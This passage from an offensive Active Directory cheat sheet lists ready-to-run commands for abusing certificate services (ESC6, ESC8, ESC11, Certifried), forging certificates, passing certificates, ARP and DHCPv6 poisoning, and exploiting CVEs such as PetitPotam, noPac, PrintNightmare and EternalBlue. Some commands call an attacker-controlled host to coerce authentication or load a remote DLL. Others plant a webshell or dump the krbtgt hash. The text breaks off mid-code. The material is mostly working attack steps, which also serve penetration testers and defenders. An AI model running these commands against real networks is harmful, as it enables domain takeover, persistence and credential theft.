certutil.exe -config "CA.consoto.local\CA" -getreg "policy\EditFlags"
reg query \\CA.contoso.com\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\contoso-CA-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy /v EditFlags
</code></pre>
<p id="bkmrk-on-another-hand%2C-it-">On another hand, it is possible to create a new <em>CRL Distribution Point</em> (CDP) that point to a controlled server is order to obtain an NTLM authentication from the AD CS server.</p>
<pre id="bkmrk-certify.exe-coerceau"><code class="language-powershell">Certify.exe coerceauth /ca:CA.contoso.local\CA01 /target:&lt;attacker_IP&gt;
</code></pre>
<p id="bkmrk-or-write-a-webshell-">Or write a webshell in the web server directory on the CA via a CDP manipluation:</p>
<pre id="bkmrk-certify.exe-writefil"><code class="language-powershell">Certify.exe writefile /ca:CA.contoso.local\CA01 /path:C:\inetpub\wwwroot\shell.asp /input:shell.asp
</code></pre>
<ul id="bkmrk-if-an-attacker-gains-0"><li>
<em>If an attacker gains control over a principal that has the <strong>ManageCertificates</strong> right over the CA, he can remotely approve pending certificate requests, subvertnig the "CA certificate manager approval" protection</em>
</li>
</ul><pre id="bkmrk-%23-request-a-certific-1"><code class="language-powershell"># Request a certificate that requires manager approval with Certify
Certify.exe request /ca:CA.contoso.local\CA01 /template:ApprovalNeeded
...
[*] Request ID : 1337

# Approve a pending request with PSPKI
PSPKI &gt; Get-CertificationAuthority -ComputerName CA.contoso.local | Get-PendingRequest -RequestID 1337 | Approve-CertificateRequest

# Download the issued certificate with Certify
Certify.exe download /ca:CA.contoso.local\CA01 /id:1337
</code></pre>
<h5 id="bkmrk-linux-6">Linux</h5>
<p id="bkmrk-when-it-is-not-possi">When it is not possible to restart the <code>CertSvc</code> service to enable the <code>EDITF_ATTRIBUTESUBJECTALTNAME2 attribute</code>,the built-in template <strong>SubCA</strong> can be usefull.</p>
<p id="bkmrk-it-is-vulnerable-to-">It is vulnerable to the <strong>ESC1</strong> attack, but only <strong>Domain Admins</strong> and <strong>Enterprise Admins</strong> can enroll in it. If a standard user try to enroll in it with <a href="https://github.com/ly4k/Certipy">Certipy</a>, he will encounter a <code>CERTSRV_E_TEMPLATE_DENIED</code> errror and will obtain a request ID with a corresponding private key.</p>
<p id="bkmrk-this-id-can-be-used-">This ID can be used by a user with the <strong>ManageCA</strong> <em>and</em> <strong>ManageCertificates</strong> rights to validate the failed request. Then, the user can retrieve the issued certificate by specifying the same ID.</p>
<ul id="bkmrk-with-manageca-right-"><li>With <strong>ManageCA</strong> right it is possible to promote new officier and enable templates</li>
</ul><pre id="bkmrk-%23-add-a-new-officier"><code class="language-bash"># Add a new officier
certipy ca -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -add-officer 'user'

# List all the templates
certipy ca -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -list-templates

# Enable a certificate template
certipy ca -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -enable-template 'SubCA'
</code></pre>
<ul id="bkmrk-with-managecertifica"><li>With <strong>ManageCertificates</strong> AND <strong>ManageCA</strong> it is possible to issue certificate from failed request</li>
</ul><pre id="bkmrk-%23-issue-a-failed-req"><code class="language-bash"># Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)
certipy ca -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -issue-request 100

# Retrieve an issued certificate
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -retrieve 100
</code></pre>
<h3 id="bkmrk-ca-configuration---e">CA Configuration - ESC6, 12</h3>
<h4 id="bkmrk-editf_attributesubje">EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6</h4>
<p id="bkmrk-if-the-ca-flag-editf">If the CA flag <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong> is set, it is possible to specify a SAN in any certificate request. This ESC has been patched with the Certifried CVE patch. If the updates are installed, exploitation requires either a template vulnerable to ESC9 or misconfigured registry keys vulnerable to ESC10.</p>
<h5 id="bkmrk-windows-7">Windows</h5>
<pre id="bkmrk-%23-find-info-about-ca"><code class="language-powershell"># Find info about CA
Certify.exe cas

# Find template for authent
Certify.exe /enrolleeSuppliesSubject
Certify.exe /clientauth

# Request certif with SAN
Certify.exe request /ca:'domain\ca' /template:"Certificate template" /altname:"admin"
</code></pre>
<h5 id="bkmrk-linux-7">Linux</h5>
<pre id="bkmrk-%23-verify-if-the-flag"><code class="language-bash"># Verify if the flag is set
certipy find -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -stdout | grep "User Specified SAN"

#To specify a user account in the SAN
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -template 'vulnerable template' -upn 'administrator@contoso.local'

#To specify a computer account in the SAN
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -template 'vulnerable template' -dns 'dc.contoso.local'
</code></pre>
<h4 id="bkmrk-shell-access-to-adcs">Shell access to ADCS CA with YubiHSM - ESC12</h4>
<p id="bkmrk-administrators-may-c">Administrators may configure the Certificate Authority to store its private key on an external device like "Yubico YubiHSM2", over storing it in the software storage.</p>
<p id="bkmrk-this-is-a-usb-device">This is a USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine. "<em>In order to generate and use keys in the YubiHSM, the Key Storage Provider must use an authentication key (sometimes dubbed "password"). This key/password is stored in the registry under <code>HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword</code> in cleartext.</em>"</p>
<p id="bkmrk-with-an-access-to-th">With an access to the PKI server, it is possible to either redirect the the YubiHSM connection to a controlled machine, or import the PKI certificate and retrieve its private key to forge arbitrary certificate. Everything is explained <a href="https://www.thehacker.recipes/a-d/movement/ad-cs/certificate-authority#shell-access-to-adcs-ca-with-yubihsm-esc12">here</a>.</p>
<h3 id="bkmrk-relay-attacks---esc8">Relay Attacks - ESC8, 11</h3>
<h4 id="bkmrk-http-endpoint---esc8">HTTP Endpoint - ESC8</h4>
<p id="bkmrk-if-the-http-endpoint">If the HTTP endpoint is up on the CA and it accept NTLM authentication, it is vulnerable to NTLM or Kerberos relay.</p>
<h5 id="bkmrk-ntlm-relay">NTLM Relay</h5>
<pre id="bkmrk-%23-prepare-relay-ntlm"><code class="language-bash"># Prepare relay
ntlmrelayx -t "http://CA/certsrv/certfnsh.asp" --adcs --template "Template name"
#Or
certipy relay -ca ca.contoso.local

# Find a way to leak the machine or user Net-NTLM hash (Printerbug, Petitpotam, PrivExchange, etc)
</code></pre>
<p id="bkmrk-esc8-with-ntlm-relay">ESC8 with NTLM relay can be performed from a WSUS poisoning.</p>
<pre id="bkmrk-%23arpspoofing-between"><code class="language-bash">#arpspoofing between the target and the WSUS server
    #In a first terminal
sudo arpspoof -i enp0s3 -t &lt;target&gt; &lt;WSUS_server&gt;
    #In a second  terminal
sudo arpspoof -i enp0s3 -t &lt;WSUS_server&gt; &lt;target&gt;

#Redirect WSUS trafic to port 80
sudo iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 80
sudo socat TCP-LISTEN:8530,fork TCP:80

# Prepare relay and wait for an authentication
ntlmrelayx -t "http://CA/certsrv/certfnsh.asp" --adcs --template "Computer"
</code></pre>
<h5 id="bkmrk-kerberos-relay">Kerberos Relay</h5>
<p id="bkmrk-it-is-possible-with-">It is possible with the last versions of <strong>mitm6</strong> and <strong>krbrelayx</strong>.</p>
<pre id="bkmrk-%23setup-the-relay-sud"><code class="language-bash">#Setup the relay
sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.contoso.local --adcs --template Machine

#Run mitm6
sudo mitm6 --domain contoso.local --host-allowlist target.contoso.local --relay CA.contoso.local -v
</code></pre>
<h4 id="bkmrk-rpc-endpoint---esc11">RPC Endpoint - ESC11</h4>
<p id="bkmrk-certificate-request-">Certificate request can be realised through the <strong>MS-ICPR</strong> RPC endpoint. If the flag <code>IF_ENFORCEENCRYPTICERTREQUEST</code> is enabled on the CA, NTLM signing is required and no relay is possible (default configuration). But, <strong>Windows Servers &lt; 2012</strong> and <strong>Windows XP</strong> clients need the flag to be removed for compatibility.</p>
<p id="bkmrk-if-enforce-encryptio">If <code>Enforce Encryption for Requests : Disabled</code> appears on the Certipy CA enumeration output, relay is possible (use this Certipy <a href="https://github.com/sploutchy/Certipy">fork </a>and this Impacket <a href="https://github.com/sploutchy/impacket">fork </a>for the moment):</p>
<pre id="bkmrk-ntlmrelayx.py--t-%22rp"><code class="language-bash">ntlmrelayx.py -t "rpc://ca.contoso.local" -rpc-mode ICPR -icpr-ca-name "ca_name" -smb2support
</code></pre>
<h3 id="bkmrk-certifried-%28cve-2022">Certifried (CVE-2022–26923)</h3>
<p id="bkmrk-the-cve-is-well-expl">The CVE is well explained <a href="https://www.thehacker.recipes/ad/movement/ad-cs/certifried">here</a>. The right to create a computer account or the write rights over an existing account are needed.</p>
<h4 id="bkmrk-windows-8">Windows</h4>
<pre id="bkmrk-%23clean-the-spns-on-t"><code class="language-powershell">#Clean the SPNs on the controlled computer account
Set-ADComputer &lt;controlled_name&gt; -ServicePrincipalName @{}
#Set the dNSHostName value to the name of a computer account to impersonate
Set-ADComputer &lt;controlled_name&gt; -DnsHostName dc.contoso.local
#Request a certificate
Certify.exe request /ca:CA.contoso.local\CA /template:"Machine"
</code></pre>
<h4 id="bkmrk-linux-8">Linux</h4>
<p id="bkmrk-to-check-if-the-cve-">To check if the CVE is present, request un certificate as a user. If Certipy print <code>Certificate object SID is [...]</code>, the CVE cannot be exploited.</p>
<pre id="bkmrk-%23clean-the-spns-on-t-0"><code class="language-bash">#Clean the SPNs on the controlled computer account
bloodyAD.py -u user1 -p password -d contoso.local setAttribute 'CN=&lt;controlled_name&gt;,CN=Computers,DC=contoso,DC=local' serviceprincipalname '[]'

#Set the dNSHostName value to the name of a computer account to impersonate
bloodyAD.py -u user1 -p password -d contoso.local setAttribute 'CN=&lt;controlled_name&gt;,CN=Computers,DC=contoso,DC=local' dnsHostName '["dc.contoso.local"]'

#Request a certificate
certipy req -u '&lt;controlled_name&gt;@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'Machine'
</code></pre>
<h2 id="bkmrk-domain-persistence">Domain Persistence</h2>
<h3 id="bkmrk-forge-certificates-w">Forge certificates with stolen CA certificate - DPERSIST1</h3>
<p id="bkmrk-with-the-ca-certific">With the <strong>CA Certificate</strong> it is possible to forge any arbitrary certificate. The CA certificate can be extracted on the CA server as presented in the <strong>THEFT2</strong> section, it's a certificate without any EKU and a "CA Version" extension. Additionally, the <strong>Issuer</strong> and the <strong>Subject</strong> are the CA itself.</p>
<p id="bkmrk-side-note%3A-since-a-f">Side note: since a forged certificate has not been issued by the CA, it cannot be revoked...</p>
<h4 id="bkmrk-windows-9">Windows</h4>
<p id="bkmrk-with-the-certificate">With the certificate and the private key in PFX format, ForgeCert can be used:</p>
<pre id="bkmrk-.%2Fforgecert.exe---ca"><code class="language-powershell">./ForgeCert.exe --CaCertPath ./ca.pfx --CaCertPassword 'Password123!' --Subject "CN=User" --SubjectAltName administrator@contoso.local --NewCertPath ./admin.pfx --NewCertPassword 'Password123!'
</code></pre>
<h4 id="bkmrk-linux-9">Linux</h4>
<p id="bkmrk-with-admin-prives-on">With admin prives on the CA server, Certipy can retrieve the CA certificate and its key:</p>
<pre id="bkmrk-certipy-ca--backup--"><code class="language-bash">certipy ca -backup -u 'user@contoso.local' -p 'password' -ca 'ca_name'
</code></pre>
<p id="bkmrk-then-certipy-can-for">Then Certipy can forge the new certificate:</p>
<pre id="bkmrk-certipy-forge--ca-pf"><code class="language-bash">certipy forge -ca-pfx ca.pfx -upn administrator@contoso.local -subject 'CN=Administrator,CN=Users,DC=CONTOSO,DC=LOCAL'
</code></pre>
<h3 id="bkmrk-trusting-rogue-ca-ce">Trusting Rogue CA Certificates - DPERSIST2</h3>
<p id="bkmrk-the-principle-is-to-">The principle is to generate a rogue self-signed CA certificate and add it to the <code>NTAuthCertificates</code> object. Then any forged certificates signed by this rogue certificate will be valid.</p>
<p id="bkmrk-with-sufficient-priv">With sufficient privileges on the <code>NTAuthCertificates</code> AD object (Enterprise Admins or Domain Admins/Administrator in the root domain), the new certificate can be pushed like this:</p>
<pre id="bkmrk-certutil.exe--dspubl"><code class="language-powershell">certutil.exe -dspublish -f C:\CERT.crt NTAuthCA
</code></pre>
<h3 id="bkmrk-malicious-misconfigu">Malicious Misconfiguration - DPERSIST3</h3>
<p id="bkmrk-similarly-to-the-esc">Similarly to the <strong>ESC5</strong>, this point covers all the interesting rights that can be set (via DACL for example) to achieve a persistence. For example, setting a <code>WriteOwner</code> right on the <code>User</code> template for the attacker can be interesting. Other targets are worthwhile:</p>
<ul id="bkmrk-ca-server%E2%80%99s-ad-compu-0"><li>CA server’s AD computer object</li>
<li>The CA server’s RPC/DCOM server</li>
<li>Any descendant AD object or container in the container <code>CN=Public Key Services,CN=Services,CN=Configuration,DC=,DC=</code> (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)</li>
<li>AD groups delegated rights to control AD CS by default or by the current organization (e.g., the built-in Cert Publishers group and any of its members)</li>
</ul><h2 id="bkmrk-pass-the-certificate">Pass-The-Certificate</h2>
<h3 id="bkmrk-pkinit">PKINIT</h3>
<p id="bkmrk-with-a-certificate-v">With a certificate valid for authentication, it is possible to request a TGT via the <strong>PKINIT</strong> protocol.</p>
<h4 id="bkmrk-windows-10">Windows</h4>
<pre id="bkmrk-%23-information-about-"><code class="language-powershell"># Information about a cert file
certutil -v -dump admin.pfx

# From a Base64 PFX
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
</code></pre>
<h4 id="bkmrk-linux-10">Linux</h4>
<pre id="bkmrk-%23-authentication-wit"><code class="language-bash"># Authentication with PFX/P12 file
certipy auth -pfx 'user.pfx'

# PEM certificate (file) + PEM private key (file)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# PFX certificate (file) + password (string, optionnal)
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
</code></pre>
<h3 id="bkmrk-schannel">Schannel</h3>
<p id="bkmrk-if-pkinit-is-not-wor">If PKINIT is not working on the domain, LDAPS can be used to pass the certificate with <code>PassTheCert</code>.</p>
<h4 id="bkmrk-windows-11">Windows</h4>
<ul id="bkmrk-grant-dcsync-rights-"><li>Grant DCSync rights to an user</li>
</ul><pre id="bkmrk-.%2Fpassthecert.exe---"><code class="language-powershell">./PassTheCert.exe --server dc.contoso.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid &lt;user_SID&gt;

#To restore
./PassTheCert.exe --server dc.contoso.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
</code></pre>
<ul id="bkmrk-add-computer-account"><li>Add computer account</li>
</ul><pre id="bkmrk-.%2Fpassthecert.exe----0"><code class="language-powershell">./PassTheCert.exe --server dc.contoso.local --cert-path C:\cert.pfx --add-computer --computer-name TEST$ --computer-password &lt;password&gt;
</code></pre>
<ul id="bkmrk-rbcd"><li>RBCD</li>
</ul><pre id="bkmrk-.%2Fpassthecert.exe----1"><code class="language-powershell">./PassTheCert.exe --server dc.contoso.local --cert-path C:\cert.pfx --rbcd --target "CN=DC,OU=Domain Controllers,DC=domain,DC=local" --sid &lt;controlled_computer_SID&gt;
</code></pre>
<ul id="bkmrk-reset-password"><li>Reset password</li>
</ul><pre id="bkmrk-.%2Fpassthecert.exe----2"><code class="language-powershell">./PassTheCert.exe --server dc.contoso.local --cert-path C:\cert.pfx --reset-password --target "CN=user1,OU=Users,DC=domain,DC=local" --new-password &lt;new_password&gt;
</code></pre>
<h4 id="bkmrk-linux-11">Linux</h4>
<p id="bkmrk-for-rbcd-attack-with">For RBCD attack with passthecert.py</p>
<pre id="bkmrk-%23create-a-new-comput"><code class="language-bash">#Create a new computer account
python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain contoso.local -dc-ip 'DC_IP'

#Add delegation rights
python3 passthecert.py -action write_rbcd -crt user.crt -key user.key -domain contoso.local -dc-ip 'DC_IP' -port 389 -delegate-to &lt;created_computer&gt; -delegate-from TARGET$

#Impersonation is now possible
</code></pre>
<p id="bkmrk-with-certipy">With Certipy</p>
<pre id="bkmrk-certipy-auth--pfx-dc"><code class="language-bash">certipy auth -pfx dc.pfx -dc-ip 'DC_IP' -ldap-shell
</code></pre>
<h2 id="bkmrk-references">References</h2>
<ul id="bkmrk-specterops-blog-spec"><li>
<a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">SpecterOps blog</a>
</li>
<li>
<a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">SpecterOps whitepaper</a>
</li>
<li>
<a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53">ESC13 article</a>
</li>
<li>
<a href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9">ESC14 article</a>
</li>
<li>
<a href="https://www.thehacker.recipes/ad/movement/ad-cs">The Hacker Recipes</a>
</li>
<li>
<a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse">Snovvcrash</a>
</li>
<li>
<a href="https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6">Certipy2.0 blog</a>
</li>
<li>
<a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7">Certipy4.0 blog</a>
</li>
<li>
<a href="https://github.com/fortalice/modifyCertTemplate">modifyCertTemplate</a>
</li>
<li>
<a href="https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks">HTTP418 Infosec</a>
</li>
<li>
<a href="https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates">Weak ACLs</a>
</li>
<li>
<a href="https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/">Sploutchy's ESC11 attack</a>
</li>
<li>
<a href="https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm">hajo's ESC12 attack</a>
</li>
<li>
<a href="https://github.com/ly4k/Certipy">Certipy</a>
</li>
<li>
<a href="https://github.com/GhostPack/Certify">Certify</a>
</li>
</ul>
                                    <div class="page-break"></div>
                    <div class="chapter-hint">Microsoft</div>
                    <h1 id="page-71">Active Directory - Python edition</h1>
                    <p id="bkmrk-this-cheatsheet-is-b">This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs, and other resources found on the web or through my experience. This was originally a private page that I made public, so it is possible that I have copy/paste some parts from other places and I forgot to credit or modify. If it the case, you can contact me on my Twitter <a href="https://twitter.com/BlWasp_"><strong>@BlWasp_</strong></a>.</p>
<p id="bkmrk-i-will-try-to-put-as">I will try to put as many links as possible at the end of the page to direct to more complete resources.</p>
<h2 id="bkmrk-misc">Misc</h2>
<h3 id="bkmrk-internal-audit-mindm">Internal audit mindmap</h3>
<p id="bkmrk-insane-mindmap-by-%40m"><a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">Insane mindmap</a> by <a href="https://twitter.com/M4yFly">@M4yFly</a>.</p>
<h3 id="bkmrk-find-the-domain-and-">Find the domain and the DCs</h3>
<p id="bkmrk-generally-the-domain">Generally the domain name can be found in <code>/etc/resolv.conf</code></p>
<p id="bkmrk-then-the-dns-is-gene">Then the DNS is generally installed on the DC : <code>nslookup domain.local</code></p>
<h3 id="bkmrk-usernames-wordlist">Usernames wordlist</h3>
<p id="bkmrk-create-a-wordlist-of">Create a wordlist of usernames from list of <code>Surname Name</code></p>
<p id="bkmrk-code-here"><a href="https://gist.githubusercontent.com/superkojiman/11076951/raw/74f3de7740acb197ecfa8340d07d3926a95e5d46/namemash.py">Code here</a></p>
<pre id="bkmrk-python3-namemash.py-"><code class="language-bash">python3 namemash.py users.txt &gt; usernames.txt
</code></pre>
<h2 id="bkmrk-initial-access">Initial Access</h2>
<p id="bkmrk-what-to-do-when-you-">What to do when you are plugged on the network without creds.</p>
<ul id="bkmrk-ntlm-authentication-"><li>NTLM authentication capture on the wire with <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-responder">Responder</a> poisoning, maybe in NTLMv1 ?</li>
<li>
<a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-ntlm-and-kerberos-re">Relay the NTLM authentications</a> to interesting endpoints, be careful to the signing
<ul><li>SMB socks to list/read/write the shares</li>
<li>LDAP to dump the directory</li>
<li>LDAPS (or maybe SMB if signing not required) to add a computer account</li>
<li>...</li>
</ul></li>
<li>ARP poisoning with <strong>bettercap</strong>, can be used to poison ARP tables of targets and receive authenticated requests normally destinated to other devices. Interesting scenarios can be found <a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/arp-poisoning#scenarios-examples">here</a>.
<ul><li>By sniffing everything on the wire with Wireshark, some secrets can be found with <strong>PCredz</strong>.</li>
</ul></li>
</ul><p id="bkmrk-first%2C-run-bettercap">First, run bettercap with this config file:</p>
<pre id="bkmrk-%23-quick-recon-of-the"><code class="language-bash"># quick recon of the network
net.probe on

# set the ARP poisoning
set arp.spoof.targets &lt;target_IP&gt;
set arp.spoof.internal true
set arp.spoof.fullduplex true

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
arp.spoof on
net.sniff on
</code></pre>
<pre id="bkmrk-sudo-.%2Fbettercap---i"><code class="language-bash">sudo ./bettercap --iface &lt;interface&gt; --caplet spoof.cap
</code></pre>
<p id="bkmrk-then-sniff-with-wire">Then sniff with Wireshark. When it is finish, save the trace in a <code>.pcap</code> file and extract the secrets:</p>
<pre id="bkmrk-python3-.%2Fpcredz--f-"><code class="language-bash">python3 ./Pcredz -f extract.pcap
</code></pre>
<ul id="bkmrk-poison-the-dhcpv6-an"><li>
<a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-mitm6">Poison the DHCPv6</a> answer to receive NTLM or Kerberos authentication
<ul><li>NTLM auths can be relayed with <code>ntlmrelayx</code>
</li>
<li>Kerberos auths can be relayed with <code>krbrelayx</code> to HTTP endpoints (ADCS, SCCM AdminService API)</li>
</ul></li>
<li>Search for a domain account
<ul><li>Look for SMB Guest and null session, and LDAP null bind</li>
</ul></li>
</ul><pre id="bkmrk-%23-smb-guest-authenti"><code class="language-bash"># SMB Guest authentication
nxc smb &lt;targets&gt; -u 'Guest' -p '' --shares

# SMB Null/Anonymous session
nxc smb &lt;DC_IP&gt; --users

# LDAP null bind
nxc ldap &lt;DC_IP&gt; -u '' -p '' --users
</code></pre>
<ul id="bkmrk-perform-rid-cycling-"><li>Perform RID cycling through SMB null session</li>
</ul><pre id="bkmrk-nxc-smb-%3Ctarget%3E--u-"><code class="language-bash">nxc smb &lt;target&gt; -u '' -p '' --rid-brute 10000
</code></pre>
<ul id="bkmrk-perform-bruteforce-a"><li>Perform bruteforce attacks
<ul><li>With SMB login bruteforce</li>
<li>With Kerbrute bruteforce</li>
</ul></li>
</ul><p id="bkmrk-allows-you-to-brutef">Allows you to bruteforce Kerberos on user accounts while indicating whether the user account exists or not. Another advantage over <code>smb_login</code> is that it doesn't correspond to the same EventId, thus bypassing potential alerts. The script can work with 2 independent lists for users and passwords, but be careful not to block accounts!</p>
<pre id="bkmrk-.%2Fkerbrute-userenum-"><code class="language-bash">./kerbrute userenum -domain domain.local users.txt
</code></pre>
<p id="bkmrk-test-for-the-top1000">Test for the Top1000 with <code>login = password</code></p>
<p id="bkmrk-possible-other-passw">Possible other passwords:</p>
<pre id="bkmrk-%28empty%29-password-p%40s"><code>(empty)
password
P@ssw0rd
</code></pre>
<ul id="bkmrk-look-for-juicy-cves-"><li>Look for juicy <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-cves">CVEs</a>
</li>
<li>Search for devices like printers, routers, or similar stuff with default creds</li>
</ul><p id="bkmrk-in-case-a-printer-%28o">In case a printer (or something similar) has an LDAP account, but use the <code>SASL</code> authentication family instead of <code>SIMPLE</code>, the classic LDAP passback exploitation with a <code>nc</code> server will not be sufficient to retrieve the credentials in clear text. Instead, use a custom LDAP server that only offer the weak <code>PLAIN</code> and <code>LOGIN</code> protocols. <a href="https://github.com/pedrojosenavasperez/ldap-passback-docker">This Docker</a> permits to operate with weak protocols.</p>
<pre id="bkmrk-docker-buildx-build-"><code class="language-bash">docker buildx build -t ldap-passback .
docker run --rm -ti -p 389:389 ldap-passback
</code></pre>
<p id="bkmrk-in-parallel%2C-listen-">In parallel, listen with tshark:</p>
<pre id="bkmrk-tshark--i-any--f-%22po"><code class="language-bash">tshark -i any -f "port 389" \
  -Y "ldap.protocolOp == 0 &amp;&amp; ldap.simple" \
  -e ldap.name -e ldap.simple -Tjson
</code></pre>
<h2 id="bkmrk-cves">CVEs</h2>
<h3 id="bkmrk-ad-oriented">AD oriented</h3>
<ul id="bkmrk-spnego-rce-%28cve-2022"><li>SPNEGO RCE (CVE-2022-37958) - No public POC for the moment</li>
<li>
<a href="https://github.com/topotam/PetitPotam">PetitPotam pre-auth</a> (CVE-2022-26925)</li>
</ul><p id="bkmrk-if-the-target-is-not">If the target is not patched, this CVE can be exploited without creds.</p>
<pre id="bkmrk-.%2Fpetitpotam.py--pip"><code class="language-bash">./petitpotam.py -pipe all &lt;attacker_IP&gt; &lt;target_IP&gt;
</code></pre>
<ul id="bkmrk-nopac-%28a.k.a.-samacc"><li>
<a href="https://github.com/Ridter/noPac">NoPac</a> (a.k.a. SamAccountName Spoofing, CVE-2021-42278 and CVE-2021-42287)</li>
</ul><p id="bkmrk-to-exploit-these-vul">To exploit these vulnerabilities you need to already control a computer account or have the right to create a new one.</p>
<pre id="bkmrk-%23get-st-python3-nopa"><code class="language-bash">#Get ST
python3 noPac.py domain.local/user1:'password' -dc-ip &lt;DC_IP&gt;

#Auto dump the hash
python3 noPac.py domain.local/user1:'password' -dc-ip &lt;DC_IP&gt; --impersonate administrator -dump -just-dc-user domain/krbtgt
</code></pre>
<ul id="bkmrk-printnightmare-%28cve-"><li>
<a href="https://github.com/ly4k/PrintNightmare">PrintNightmare</a> (CVE-2021-1675 / CVE-2021-34527)</li>
</ul><pre id="bkmrk-%23load-a-dll-hosted-o"><code class="language-bash">#Load a DLL hosted on a SMB server on the attacker machine
./printnightmare.py -dll '\\&lt;attacker_IP&gt;\smb\add_user.dll' 'user1:password@&lt;target_IP&gt;'

#Load a DLL hosted on the target, and specify a custom driver name
./printnightmare.py -dll 'C:\Windows\System32\spool\drivers\x64\3\old\1\add_user.dll' -name 'Patapouf' 'user1:password@&lt;target_IP&gt;'
</code></pre>
<ul id="bkmrk-zerologon-%28cve-2020-"><li>
<a href="https://www.thehacker.recipes/ad/movement/netlogon/zerologon#password-change-disruptive">Zerologon</a> (CVE-2020-1472)</li>
</ul><p id="bkmrk-the-relay-technique-">The relay technique is preferable to the other one which is more risky and potentially destructive. See in the link.</p>
<ul id="bkmrk-eternalblue-%2F-blue-k"><li>EternalBlue / Blue Keep (MS17-010 / CVE-2019-0708)</li>
</ul><p id="bkmrk-the-exploits-in-the-">The exploits in the Metasploit framework are good for these two CVEs.</p>
<pre id="bkmrk-%23eternalblue-msf6-ex"><code class="language-bash">#EternalBlue
msf6 exploit(windows/smb/ms17_010_psexec) &gt;

#Blue Keep
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;
</code></pre>
<ul id="bkmrk-smbghost-%28cve-2020-0"><li>SMBGhost (CVE-2020-0796)</li>
</ul><p id="bkmrk-be-careful%2C-this-exp"><strong>Be careful, this exploit is pretty unstable and the risk of BSOD is really important.</strong> The exploit in the Metasploit framework is good for this CVE.</p>
<pre id="bkmrk-msf6-exploit%28windows"><code class="language-bash">msf6 exploit(windows/smb/cve_2020_0796_smbghost) &gt;
</code></pre>
<ul id="bkmrk-rc4-md4-downgrade-%28c"><li>
<a href="https://github.com/Bdenneu/CVE-2022-33679">RC4-MD4 downgrade</a> (CVE-2022-33679)</li>
</ul><p id="bkmrk-to-exploit-this-cve-">To exploit this CVE the <strong>RC4-MD4</strong> encryption must be enabled on the KDC, and an AS-REP Roastable account is needed to obtain an ST for the target.</p>
<pre id="bkmrk-.%2Fcve-2022-33079.py-"><code class="language-bash">./CVE-2022-33079.py -dc-ip &lt;DC_IP&gt; domain.local/&lt;as-rep_roastable_user&gt; &lt;target_NETBIOS&gt;
</code></pre>
<ul id="bkmrk-credentials-roaming-"><li>
<a href="https://www.mandiant.com/resources/blog/apt29-windows-credential-roaming?s=33">Credentials Roaming</a> (CVE-2022-30170)</li>
</ul><pre id="bkmrk-%23-fetch-current-user"><code class="language-powershell"># Fetch current user object
$user = get-aduser &lt;victim username&gt; -properties @('msPKIDPAPIMasterKeys','msPKIAccountCredentials', 'msPKI-CredentialRoamingTokens','msPKIRoamingTimestamp')

# Install malicious Roaming Token (spawns calc.exe)
